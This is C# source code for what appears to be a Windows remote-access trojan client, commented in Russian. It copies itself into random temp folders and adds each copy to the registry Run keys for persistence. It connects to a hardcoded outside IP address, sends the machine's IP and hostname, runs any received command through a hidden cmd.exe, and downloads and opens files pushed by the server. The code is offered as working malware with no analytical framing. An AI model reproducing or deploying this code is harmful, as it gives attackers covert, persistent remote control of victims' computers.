using System;
using System.IO;
using System.Net.Sockets;
using System.Text;
using System.Diagnostics;
using System.Threading;
using Microsoft.Win32;

class Client
{
    private const string ServerIP = "193.58.121.250";
    private const int ServerPort = 7175;
    private const int PingInterval = 30000;
    private const int ReconnectInterval = 6000; // Пауза для переподключения (5 секунд)

    static void Main()
    {
        // Копируем исполняемый файл в случайное место на диске
        CopyToRandomLocation();

        // Добавляем программу в автозагрузку
        AddToStartup();

        while (true)
        {
            try
            {
                Console.WriteLine("Attempting to connect to the server...");
                using (TcpClient client = new TcpClient())
                {
                    client.Connect(ServerIP, ServerPort);
                    Console.WriteLine("Connected to server!");

                    NetworkStream stream = client.GetStream();

                    Thread commandsThread = new Thread(() => ListenForCommands(stream));
                    Thread filesThread = new Thread(() => ListenForFiles(stream));

                    commandsThread.Start();
                    filesThread.Start();

                    SendClientInfo(stream);

                    while (client.Connected)
                    {
                        SendPing(stream);
                        Thread.Sleep(PingInterval);
                    }
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine("Connection failed: " + ex.Message);
            }

            Console.WriteLine("Retrying connection in 5 seconds...");
            Thread.Sleep(ReconnectInterval);
        }
    }

    private static void AddToStartup()
    {
        try
        {
            string executablePath = System.Reflection.Assembly.GetExecutingAssembly().Location;
            string appName = Path.GetFileNameWithoutExtension(executablePath);

            // Добавляем программу в реестр HKCU\Run
            AddToRegistry(appName, executablePath);

            // Добавляем программу в реестр HKLM\Run
            AddToRegistry(appName, executablePath, Registry.LocalMachine.OpenSubKey(@"Software\Microsoft\Windows\CurrentVersion\Run", true));
        }
        catch (Exception ex)
        {
            Console.WriteLine("Failed to add to startup: " + ex.Message);
        }
    }

    private static void AddToRegistry(string appName, string path, RegistryKey registryKey = null)
    {
        if (registryKey == null)
        {
            registryKey = Registry.CurrentUser.OpenSubKey(@"Software\Microsoft\Windows\CurrentVersion\Run", true);
        }
        registryKey.SetValue(appName, path);
    }

    private static void CopyToRandomLocation()
    {
        try
        {
            string originalPath = System.Reflection.Assembly.GetExecutingAssembly().Location;

            // Копирование в несколько случайных мест и добавление в автозагрузку
            for (int i = 0; i < 3; i++)
            {
                string randomFolder = Path.Combine(Path.GetTempPath(), Path.GetRandomFileName());
                Directory.CreateDirectory(randomFolder);

                string newFilePath = Path.Combine(randomFolder, Path.GetFileName(originalPath));
                File.Copy(originalPath, newFilePath, true);

                Console.WriteLine("[Client] File copied to: " + newFilePath);

                // Добавляем копию в автозагрузку
                AddCopyToStartup(newFilePath);
            }
        }
        catch (Exception ex)
        {
            Console.WriteLine("Error copying to random location: " + ex.Message);
        }
    }

    private static void AddCopyToStartup(string filePath)
    {
        try
        {
            string appName = Path.GetFileNameWithoutExtension(filePath);

            // Добавляем копию в реестр HKCU\Run
            AddToRegistry(appName, filePath);

            // Добавляем копию в реестр HKLM\Run
            AddToRegistry(appName, filePath, Registry.LocalMachine.OpenSubKey(@"Software\Microsoft\Windows\CurrentVersion\Run", true));
        }
        catch (Exception ex)
        {
            Console.WriteLine("Failed to add copy to startup: " + ex.Message);
        }
    }

    private static void SendClientInfo(NetworkStream stream)
    {
        string clientInfo = GetLocalIPAddress() + "_" + Environment.MachineName;
        byte[] infoBytes = Encoding.UTF8.GetBytes(clientInfo);
        stream.Write(infoBytes, 0, infoBytes.Length);
    }

    private static string GetLocalIPAddress()
    {
        try
        {
            var host = System.Net.Dns.GetHostEntry(System.Net.Dns.GetHostName());
            foreach (var ip in host.AddressList)
            {
                if (ip.AddressFamily == System.Net.Sockets.AddressFamily.InterNetwork)
                    return ip.ToString();
            }
        }
        catch { }
        return "127.0.0.1";
    }

    private static void SendPing(NetworkStream stream)
    {
        byte[] pingData = Encoding.UTF8.GetBytes("1");
        stream.Write(pingData, 0, pingData.Length);
    }

    private static void ListenForCommands(NetworkStream stream)
    {
        byte[] buffer = new byte[1024];
        while (true)
        {
            try
            {
                int bytesRead = stream.Read(buffer, 0, buffer.Length);
                if (bytesRead > 0)
                {
                    string command = Encoding.UTF8.GetString(buffer, 0, bytesRead);
                    ExecuteCommand(command);
                }
            }
            catch
            {
                break;
            }
        }
    }

    private static void ExecuteCommand(string command)
    {
        try
        {
            ProcessStartInfo psi = new ProcessStartInfo("cmd.exe", "/c " + command)
            {
                CreateNoWindow = true,
                UseShellExecute = false
            };
            Process.Start(psi);
        }
        catch { }
    }

    private static void ListenForFiles(NetworkStream stream)
    {
        byte[] buffer = new byte[4096];
        while (true)
        {
            try
            {
                int fileNameLength = stream.Read(buffer, 0, buffer.Length);
                if (fileNameLength > 0)
                {
                    string fileName = Encoding.UTF8.GetString(buffer, 0, fileNameLength).TrimEnd('\0');

                    int fileSize = stream.Read(buffer, 0, buffer.Length);
                    if (fileSize > 0)
                    {
                        string filePath = SaveFile(buffer, fileSize, fileName);
                        OpenFile(filePath);
                    }
                }
            }
            catch
            {
                break;
            }
        }
    }

    private static string SaveFile(byte[] data, int size, string fileName)
    {
        string tempFolder = Path.Combine(Path.GetTempPath(), Path.GetRandomFileName());
        Directory.CreateDirectory(tempFolder);

        string filePath = Path.Combine(tempFolder, fileName);
        File.WriteAllBytes(filePath, SubArray(data, size));
        return filePath;
    }

    private static byte[] SubArray(byte[] data, int length)
    {
        byte[] result = new byte[length];
        Array.Copy(data, result, length);
        return result;
    }

    private static void OpenFile(string filePath)
    {
        try
        {
            if (File.Exists(filePath))
            {
                Process.Start("cmd.exe", "/c start \"\" \"" + filePath + "\"");
            }
        }
        catch { }
    }
}
